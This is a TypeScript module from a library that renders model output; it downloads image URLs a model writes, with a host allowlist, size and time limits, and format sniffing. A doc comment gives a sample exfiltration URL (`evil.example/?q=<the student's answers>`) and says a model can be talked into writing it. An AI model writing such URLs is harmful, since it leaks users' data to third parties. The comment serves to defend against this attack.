// @typstream/engine/images: `fetchImages`, an `ImageResolver` that downloads
// the image URLs a model writes (PLAN §6.4 "Images"). Its own entry point, so
// apps that don't show images from the web don't load it.

import type { ImageResolver } from "./document-images";

export type { ImageResolver };

/**
 * How {@link fetchImages} fetches.
 * @public
 */
export interface FetchImagesOptions {
  /**
   * Hosts images may come from: `"upload.wikimedia.org"`, `"*.example.org"`
   * (its subdomains), or `"*"` for any. Required: a model can be talked into
   * writing an image URL that carries what it read to someone else's server
   * (`https://evil.example/?q=<the student's answers>`), and the page fetches
   * it as soon as the string is complete.
   */
  hosts: readonly string[];
  /**
   * Fetch this URL instead, e.g. the app's own proxy, which can cache, resize
   * and get past hosts that don't allow cross-origin requests:
   * `(url) => "/api/image?url=" + encodeURIComponent(url)`. It's fetched with
   * the page's credentials; images from hosts directly without.
   */
  proxy?: (url: string) => string;
  /** Largest image, bytes. Default 10 MB. */
  maxBytes?: number;
  /** How long a download may take, ms. Default 15 s. */
  timeoutMs?: number;
  /** Default `fetch`. */
  fetch?: (url: string, init: RequestInit) => Promise<Response>;
}

/** The formats Typst decodes, by their first bytes; PDF too, which isn't let in. */
const sniff = (b: Uint8Array): boolean => {
  const starts = (sig: number[], at = 0) => sig.every((x, i) => b[at + i] === x);
  if (starts([0x89, 0x50, 0x4e, 0x47]) || starts([0xff, 0xd8, 0xff]) || starts([0x47, 0x49, 0x46, 0x38])) return true;
  if (starts([0x52, 0x49, 0x46, 0x46]) && starts([0x57, 0x45, 0x42, 0x50], 8)) return true;
  // SVG: text whose first element is `<svg`, after an XML declaration, comments or a doctype (the decoder drops a BOM).
  const head = new TextDecoder().decode(b.subarray(0, 4096));
  return /^\s*(?:<\?xml[^>]*>\s*|<!--[\s\S]*?-->\s*|<!DOCTYPE[^>]*>\s*)*<svg[\s>]/i.test(head);
};

const allowed = (host: string, hosts: readonly string[]): boolean =>
  hosts.some((h) => h === "*" || h === host || (h.startsWith("*.") && host.endsWith(h.slice(1))));

const read = async (response: Response, max: number): Promise<Uint8Array> => {
  const tooLarge = () => new Error(`larger than ${Math.round(max / 1e6)} MB`);
  if (Number(response.headers.get("content-length")) > max) throw tooLarge();
  if (!response.body) return new Uint8Array(await response.arrayBuffer());
  const chunks: Uint8Array[] = [];
  let size = 0;
  const reader = response.body.getReader();
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    size += value.length;
    if (size > max) {
      reader.cancel().catch(() => {});
      throw tooLarge();
    }
    chunks.push(value);
  }
  const bytes = new Uint8Array(size);
  let at = 0;
  for (const c of chunks) {
    bytes.set(c, at);
    at += c.length;
  }
  return bytes;
};

/**
 * An {@link ImageResolver} that downloads `http(s)` image URLs from the hosts
 * you allow, so a model can show images from the web:
 * `<Typstream resolveImage={fetchImages({ hosts: ["upload.wikimedia.org"] })}>`.
 * Other paths are left to the document's files (`null`). It accepts PNG, JPEG,
 * GIF, WebP and SVG, by their content, and keeps what it downloaded for as
 * long as it lives, so make one per app rather than per render. Images come
 * from the page, so the host must allow cross-origin requests; `proxy` goes
 * through your server instead.
 * @public
 */
export const fetchImages = (options: FetchImagesOptions): ImageResolver => {
  const { hosts, proxy, maxBytes = 10_000_000, timeoutMs = 15_000 } = options;
  const cache = new Map<string, Promise<Uint8Array>>();
  const download = async (url: URL): Promise<Uint8Array> => {
    const signal = AbortSignal.timeout(timeoutMs);
    const init: RequestInit = proxy
      ? { signal, credentials: "same-origin" }
      : { signal, credentials: "omit", referrerPolicy: "no-referrer" };
    const response = await (options.fetch ?? fetch)(proxy ? proxy(url.href) : url.href, init);
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const bytes = await read(response, maxBytes);
    if (!sniff(bytes)) throw new Error("not a PNG, JPEG, GIF, WebP or SVG image");
    return bytes;
  };
  return (path, { signal }) => {
    if (!/^https?:\/\//i.test(path)) return null;
    let url: URL;
    try {
      url = new URL(path);
    } catch {
      return null;
    }
    if (!allowed(url.hostname, hosts)) throw new Error(`${url.hostname} isn't an allowed image host`);
    let bytes = cache.get(url.href);
    if (!bytes) {
      bytes = download(url);
      cache.set(url.href, bytes);
      // A failure is forgotten, so the next document tries again.
      bytes.catch(() => cache.delete(url.href));
    }
    // Shared by every document asking for it, so one being disposed only stops waiting.
    return new Promise((resolve, reject) => {
      signal.addEventListener("abort", () => reject(signal.reason), { once: true });
      (bytes as Promise<Uint8Array>).then(resolve, reject);
    });
  };
};
